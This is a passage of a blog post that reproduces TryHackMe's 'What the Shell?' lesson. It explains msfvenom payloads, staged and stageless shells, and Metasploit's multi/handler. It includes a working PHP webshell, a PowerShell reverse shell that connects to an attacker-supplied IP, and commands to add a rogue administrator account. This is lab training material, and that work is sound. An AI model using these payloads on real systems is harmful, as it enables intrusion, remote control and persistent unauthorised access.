+<li>**LHOST&#x3D;**&lt;IP&gt;<ul>
+<li>Specifies the IP to connect back to. When using TryHackMe, this will be your <a target="_blank" rel="noopener" href="http://10.10.10.10/">tun0 IP address</a>. If you cannot load the link then you are not <a target="_blank" rel="noopener" href="https://tryhackme.com/room/welcome">connected to the VPN</a>.</li>
+</ul>
+</li>
+<li>**LPORT&#x3D;**&lt;port&gt;<ul>
+<li>The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn’t already in use; however, ports below 1024 are restricted and require a listener running with root privileges.</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="Staged-vs-Stageless"><a href="#Staged-vs-Stageless" class="headerlink" title="Staged vs Stageless"></a><em>Staged vs Stageless</em></h2><p>Before we go any further, there are another two concepts which must be introduced: <em><strong>staged</strong></em> reverse shell payloads and <em><strong>stageless</strong></em> reverse shell payloads.</p>
+<ul>
+<li><em><strong>Staged</strong></em> payloads are sent in two parts. The first part is called the <em>stager</em>. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn’t actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts – a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener – usually the Metasploit multi&#x2F;handler, which will be covered in the next task.</li>
+<li><em><strong>Stageless</strong></em> payloads are more common – these are what we’ve been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.</li>
+</ul>
+<p>Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove. Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by less-effective antivirus software. Modern day antivirus solutions will also make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager, making staged payloads less effective than they would once have been in this area.</p>
+<hr>
+<h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a><em>Meterpreter</em></h2><p>On the subject of Metasploit, another important thing to discuss is a <em>Meterpreter</em> shell. Meterpreter shells are Metasploit’s own brand of fully-featured shell. They are completely stable, making them a very good thing when working with Windows targets. They also have a lot of inbuilt functionality of their own, such as file uploads and downloads. If we want to use any of Metasploit’s post-exploitation tools then we need to use a meterpreter shell, however, that is a topic for another time. The downside to meterpreter shells is that they <em>must</em> be caught in Metasploit.</p>
+<hr>
+<h2 id="Payload-Naming-Conventions"><a href="#Payload-Naming-Conventions" class="headerlink" title="Payload Naming Conventions"></a><em>Payload Naming Conventions</em></h2><p>When working with msfvenom, it’s important to understand how the naming system works. The basic convention is as follows:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;OS&gt;/&lt;arch&gt;/&lt;payload&gt;</span><br></pre></td></tr></table></figure>
+
+<p>For example:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux/x86/shell_reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<p>This would generate a stageless reverse shell for an x86 Linux target.</p>
+<p>The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows/shell_reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<p>For a 64bit Windows target, the arch would be specified as normal (x64).</p>
+<p>Let’s break the payload section down a little further.</p>
+<p>In the above examples the payload used was <code>shell_reverse_tcp</code>. This indicates that it was a <em>stageless</em> payload. How? Stageless payloads are denoted with underscores (<code>_</code>). The staged equivalent to this payload would be:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<p>As staged payloads are denoted with another forward slash (<code>/</code>).</p>
+<p>This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<p>A Linux 32bit stageless Meterpreter payload would look like this:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux/x86/meterpreter_reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>Aside from the <code>msfconsole</code> man page, the other important thing to note when working with msfvenom is:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --list payloads</span><br></pre></td></tr></table></figure>
+
+<p>This can be used to list all available payloads, which can then be piped into <code>grep</code> to search for a specific set of payloads. For example:</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312202114477.png" alt="iFO6ydX"></p>
+<p>This gives us a full set of Linux meterpreter payloads for 32bit targets.</p>
+<h1 id="Metasploit-multi-handler"><a href="#Metasploit-multi-handler" class="headerlink" title="Metasploit multi&#x2F;handler"></a>Metasploit multi&#x2F;handler</h1><p>Multi&#x2F;Handler is a superb tool for catching reverse shells. It’s essential if you want to use Meterpreter shells, and is the go-to when using staged payloads.</p>
+<p>Fortunately, it’s relatively easy to use:</p>
+<ol>
+<li>Open Metasploit with <code>msfconsole</code></li>
+<li>Type <code>use multi/handler</code>, and press enter</li>
+</ol>
+<p>We are now primed to start a multi&#x2F;handler session. Let’s take a look at the available options using the <code>options</code> command:</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312202114991.png" alt="rAdZsKH"></p>
+<p>There are three options we need to set: payload, LHOST and LPORT. These are all identical to the options we set when generating shellcode with Msfvenom – a payload specific to our target, as well as a listening address and port with which we can receive a shell. Note that the LHOST <em>must</em> be specified here, as metasploit will not listen on all network interfaces like netcat or socat will; it must be told a specific address to listen with (when using TryHackMe, this will be your <a target="_blank" rel="noopener" href="http://10.10.10.10/">tun0 address</a>). We set these options with the following commands:</p>
+<ul>
+<li><code>set PAYLOAD &lt;payload&gt;</code></li>
+<li><code>set LHOST &lt;listen-address&gt;</code></li>
+<li><code>set LPORT &lt;listen-port&gt;</code></li>
+</ul>
+<p>We should now be ready to start the listener!</p>
+<p>Let’s do this by using the <code>exploit -j</code> command. This tells Metasploit to launch the module, running as a <strong>j</strong>ob in the background.</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312202115953.png" alt="qIr6o2B"></p>
+<p>You may notice that in the above screenshot, Metasploit is listening on a port under 1024. To do this, Metasploit <em>must</em> be run with sudo permissions.</p>
+<p>When the staged payload generated in the previous task is run, Metasploit receives the connection, sending the remainder of the payload and giving us a reverse shell:</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312202115224.png" alt="COmVX8K"></p>
+<p>Notice that, because the multi&#x2F;handler was originally backgrounded, we needed to use <code>sessions 1</code> to foreground it again. This worked as it was the only session running. Had there been other sessions active, we would have needed to use <code>sessions</code> to see all active sessions, then use <code>sessions &lt;number&gt;</code> to select the appropriate session to foreground. This number would also have been displayed in the line where the shell was opened (see “<em>Command Shell session <strong>1</strong> opened</em>“).</p>
+<h1 id="WebShells"><a href="#WebShells" class="headerlink" title="WebShells"></a>WebShells</h1><p>There are times when we encounter websites that allow us an opportunity to upload, in some way or another, an executable file. Ideally we would use this opportunity to upload code that would activate a reverse or bind shell, but sometimes this is not possible. In these cases we would instead upload a <em>webshell</em>. See the <a target="_blank" rel="noopener" href="https://tryhackme.com/room/uploadvulns">Upload Vulnerabilities Room</a> for a more extensive look at this concept.</p>
+<p>“Webshell” is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage – either through a HTML form, or directly as arguments in the URL – which are then executed by the script, with the results returned and written to the page. This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell.</p>
+<p>As PHP is still the most common server side scripting language, let’s have a look at some simple code for this.</p>
+<p>In a very basic one line format:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &quot;&lt;pre&gt;&quot; . shell_exec($_GET[&quot;cmd&quot;]) . &quot;&lt;/pre&gt;&quot;; ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>This will take a GET parameter in the URL and execute it on the system with <code>shell_exec()</code>. Essentially, what this means is that any commands we enter in the URL after <code>?cmd=</code> will be executed on the system – be it Windows or Linux. The “pre” elements are to ensure that the results are formatted correctly on the page.</p>
+<p>Let’s see this in action:</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312202116810.png" alt="W19gHwL"></p>
+<p>Notice that when navigating the shell, we used a GET parameter “cmd” with the command “ifconfig”, which correctly returned the network information of the box. In other words, by entering the <code>ifconfig</code> command (used to check the network interfaces on a Linux target) into the URL of our shell, it was executed on the system, with the results returned to us. This would work for any other command we chose to use (e.g. <code>whoami</code>, <code>hostname</code>, <code>arch</code>, etc).</p>
+<p>As mentioned previously, there are a variety of webshells available on Kali by default at <code>/usr/share/webshells</code> – including the infamous <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">PentestMonkey php-reverse-shell</a> – a full reverse shell written in PHP. Note that most generic, language specific (e.g. PHP) reverse shells are written for Unix based targets such as Linux webservers. They will not work on Windows by default.</p>
+<p>When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse&#x2F;bind shell in the language of the server. With the former method, obtaining RCE is often done with a URL Encoded Powershell Reverse Shell. This would be copied into the URL as the <code>cmd</code> argument:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27&lt;IP&gt;%27%2C&lt;PORT&gt;%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22</span><br><span class="line"></span><br><span class="line">powershell -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#x27;&lt;IP&gt;&#x27;,&lt;PORT&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span><br></pre></td></tr></table></figure>
+
+<p>This is the same shell we encountered in Task 8, however, it has been URL encoded to be used safely in a GET parameter. Remember that the IP and Port (bold, towards end of the top line) will still need to be changed in the above code.</p>
+<h1 id="Next-Steps"><a href="#Next-Steps" class="headerlink" title="Next Steps"></a>Next Steps</h1><p>Ok, we have a shell. Now what?</p>
+<p>We’ve covered lots of ways to generate, send and receive shells. The one thing that these all have in common is that they tend to be unstable and non-interactive. Even Unix style shells which are easier to stabilise are not ideal. So, what can we do about this?</p>
+<p>On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at <code>/home/&lt;user&gt;/.ssh</code> are often an ideal way to do this. In CTFs it’s also not infrequent to find credentials lying around somewhere on the box. Some exploits will also allow you to add your own account. In particular something like <a target="_blank" rel="noopener" href="https://dirtycow.ninja/">Dirty C0w</a> or a writeable &#x2F;etc&#x2F;shadow or &#x2F;etc&#x2F;passwd would quickly give you SSH access to the machine, assuming SSH is open.</p>
+<p>On Windows the options are often more limited. It’s sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at <code>C:\Program Files\FileZilla Server\FileZilla Server.xml</code><br> or <code>C:\xampp\FileZilla Server\FileZilla Server.xml</code><br>. These can be MD5 hashes or in plaintext, depending on the version.</p>
+<p>Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it’s possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.</p>
+<p>The syntax for this is as follows:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user &lt;username&gt; &lt;password&gt; /add</span><br><span class="line">net localgroup administrators &lt;username&gt; /add</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><em>The important take away from this task:</em></p>
+<p>Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, however, they will never be as fully featured as a native shell. Ideally we always want to escalate into using a “normal” method for accessing the machine, as this will invariably be easier to use for further exploitation of the target.</p>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" title="头像" alt="头像"></a><div class="post-copyright__author_name">hihopkc</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://hihopkc.github.io/posts/eb53.html">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://hihopkc.github.io/posts/eb53.html')">【THM】What the Shell?-Learn</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://hihopkc.github.io/posts/eb53.html"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=【THM】What the Shell?-Learn&amp;url=https://hihopkc.github.io/posts/eb53.html&amp;pic=https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312202028659.png" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://hihopkc.github.io" target="_blank">嘻哈磕碜のBlogs</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312202028659.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/posts/de98.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312180950207.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">【THM】Res-Practice</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div><div class="comment-tips" id="comment-tips"><span>✅ 你无需删除空行，直接评论以获取最佳展示效果</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" ait="status"/></div></div><div class="author-info__description">站在巨人的肩上</div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">hihopkc</h1><div class="author-info__desc"></div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hihopkc" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/56853573" target="_blank" title="BiliBili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来看我的博客鸭~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#What-is-a-shell"><span class="toc-number">1.</span> <span class="toc-text">What is a shell?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tools"><span class="toc-number">2.</span> <span class="toc-text">Tools</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Netcat"><span class="toc-number">2.1.</span> <span class="toc-text">Netcat:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Socat"><span class="toc-number">2.2.</span> <span class="toc-text">Socat:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit-%E2%80%93-multi-handler"><span class="toc-number">2.3.</span> <span class="toc-text">Metasploit – multi&#x2F;handler:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Msfvenom"><span class="toc-number">2.4.</span> <span class="toc-text">Msfvenom:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Types-of-shell"><span class="toc-number">3.</span> <span class="toc-text">Types of shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-Shell-example"><span class="toc-number">3.1.</span> <span class="toc-text">Reverse Shell example:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bind-Shell-example"><span class="toc-number">3.2.</span> <span class="toc-text">Bind Shell example:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Netcat-1"><span class="toc-number">4.</span> <span class="toc-text">Netcat</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-Shells"><span class="toc-number">4.1.</span> <span class="toc-text">Reverse Shells</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bind-Shells"><span class="toc-number">4.2.</span> <span class="toc-text">Bind Shells</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Netcat-Shell-Stabilisation"><span class="toc-number">5.</span> <span class="toc-text">Netcat Shell Stabilisation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Technique-1-Python"><span class="toc-number">5.1.</span> <span class="toc-text">Technique 1: Python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Technique-2-rlwrap"><span class="toc-number">5.2.</span> <span class="toc-text">Technique 2: rlwrap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Technique-3-Socat"><span class="toc-number">5.3.</span> <span class="toc-text">Technique 3: Socat</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Socat-1"><span class="toc-number">6.</span> <span class="toc-text">Socat</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-Shells-1"><span class="toc-number">6.1.</span> <span class="toc-text">Reverse Shells</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bind-Shells-1"><span class="toc-number">6.2.</span> <span class="toc-text">Bind Shells</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Socat-Encrypted-Shells"><span class="toc-number">7.</span> <span class="toc-text">Socat Encrypted Shells</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Answer-the-questions-below"><span class="toc-number">7.1.</span> <span class="toc-text">Answer the questions below</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Common-Shell-Payloads"><span class="toc-number">8.</span> <span class="toc-text">Common Shell Payloads</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#msfvenom"><span class="toc-number">9.</span> <span class="toc-text">msfvenom</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Staged-vs-Stageless"><span class="toc-number">9.1.</span> <span class="toc-text">Staged vs Stageless</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Meterpreter"><span class="toc-number">9.2.</span> <span class="toc-text">Meterpreter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload-Naming-Conventions"><span class="toc-number">9.3.</span> <span class="toc-text">Payload Naming Conventions</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Metasploit-multi-handler"><span class="toc-number">10.</span> <span class="toc-text">Metasploit multi&#x2F;handler</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WebShells"><span class="toc-number">11.</span> <span class="toc-text">WebShells</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Next-Steps"><span class="toc-number">12.</span> <span class="toc-text">Next Steps</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/eb53.html" title="【THM】What the Shell?-Learn"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312202028659.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【THM】What the Shell?-Learn"/></a><div class="content"><a class="title" href="/posts/eb53.html" title="【THM】What the Shell?-Learn">【THM】What the Shell?-Learn</a><time datetime="2023-12-20T12:27:44.000Z" title="发表于 2023-12-20 20:27:44">2023-12-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/de98.html" title="【THM】Res-Practice"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312180950207.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【THM】Res-Practice"/></a><div class="content"><a class="title" href="/posts/de98.html" title="【THM】Res-Practice">【THM】Res-Practice</a><time datetime="2023-12-18T01:48:24.000Z" title="发表于 2023-12-18 09:48:24">2023-12-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/860a.html" title="ISCTF2023WP"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312112356804.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ISCTF2023WP"/></a><div class="content"><a class="title" href="/posts/860a.html" title="ISCTF2023WP">ISCTF2023WP</a><time datetime="2023-12-11T15:43:26.000Z" title="发表于 2023-12-11 23:43:26">2023-12-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3dda.html" title="【THM】dogcat-Practice"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312100938316.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【THM】dogcat-Practice"/></a><div class="content"><a class="title" href="/posts/3dda.html" title="【THM】dogcat-Practice">【THM】dogcat-Practice</a><time datetime="2023-12-10T01:20:18.000Z" title="发表于 2023-12-10 09:20:18">2023-12-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/43dc.html" title="【THM】Startup-Practice"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312201134358.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【THM】Startup-Practice"/></a><div class="content"><a class="title" href="/posts/43dc.html" title="【THM】Startup-Practice">【THM】Startup-Practice</a><time datetime="2023-12-09T00:35:58.000Z" title="发表于 2023-12-09 08:35:58">2023-12-09</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="footer_deal"><a class="deal_link" href="mailto:975025272@qq.com" title="email"><i class="anzhiyufont anzhiyu-icon-envelope"></i></a><img class="footer_mini_logo" title="返回顶部" alt="返回顶部" onclick="anzhiyu.scrollToDest(0, 500)" src= 